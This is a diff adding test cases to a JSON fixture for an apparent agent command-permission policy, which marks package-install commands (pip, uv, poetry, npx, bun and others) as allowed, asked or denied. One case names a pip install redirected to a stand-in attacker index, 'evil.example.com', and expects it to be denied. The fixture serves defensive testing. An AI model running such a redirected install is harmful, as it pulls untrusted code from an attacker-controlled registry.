@@ -2695,5 +2695,129 @@
     "repo_root": "/repo",
     "want": "ask",
     "want_rule_id": "P3.unresolved"
+  },
+  {
+    "name": "python -m pip install asks like pip install",
+    "tool": "Bash",
+    "command": "python -m pip install requests",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "ask",
+    "want_rule_id": "P6.package-install"
+  },
+  {
+    "name": "python -m pip install with a redirected index still denies",
+    "tool": "Bash",
+    "command": "python3 -m pip install --index-url https://evil.example.com/simple foo",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny",
+    "want_rule_id": "P6.registry-redirect"
+  },
+  {
+    "name": "uv sync asks",
+    "tool": "Bash",
+    "command": "uv sync",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "ask",
+    "want_rule_id": "P6.package-install"
+  },
+  {
+    "name": "uv pip install asks",
+    "tool": "Bash",
+    "command": "uv pip install requests",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "ask",
+    "want_rule_id": "P6.package-install"
+  },
+  {
+    "name": "poetry install asks",
+    "tool": "Bash",
+    "command": "poetry install",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "ask",
+    "want_rule_id": "P6.package-install"
+  },
+  {
+    "name": "pipx install asks",
+    "tool": "Bash",
+    "command": "pipx install black",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "ask",
+    "want_rule_id": "P6.package-install"
+  },
+  {
+    "name": "bun add asks",
+    "tool": "Bash",
+    "command": "bun add left-pad",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "ask",
+    "want_rule_id": "P6.package-install"
+  },
+  {
+    "name": "npx of a remote package asks",
+    "tool": "Bash",
+    "command": "npx some-remote-package",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "ask",
+    "want_rule_id": "P6.package-install"
+  },
+  {
+    "name": "pnpm dlx asks",
+    "tool": "Bash",
+    "command": "pnpm dlx some-remote-package",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "ask",
+    "want_rule_id": "P6.package-install"
+  },
+  {
+    "name": "uvx of a remote package asks",
+    "tool": "Bash",
+    "command": "uvx some-remote-package",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "ask",
+    "want_rule_id": "P6.package-install"
+  },
+  {
+    "name": "npx --no-install of a local binary stays allowed",
+    "tool": "Bash",
+    "command": "npx --no-install tsc",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "allow"
+  },
+  {
+    "name": "graft init asks",
+    "tool": "Bash",
+    "command": "graft init",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "ask",
+    "want_rule_id": "P6.package-install"
+  },
+  {
+    "name": "graft build --deep asks",
+    "tool": "Bash",
+    "command": "graft build --deep",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "ask",
+    "want_rule_id": "P6.package-install"
+  },
+  {
+    "name": "pip list stays allowed",
+    "tool": "Bash",
+    "command": "python -m pip list",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "allow"
   }
 ]
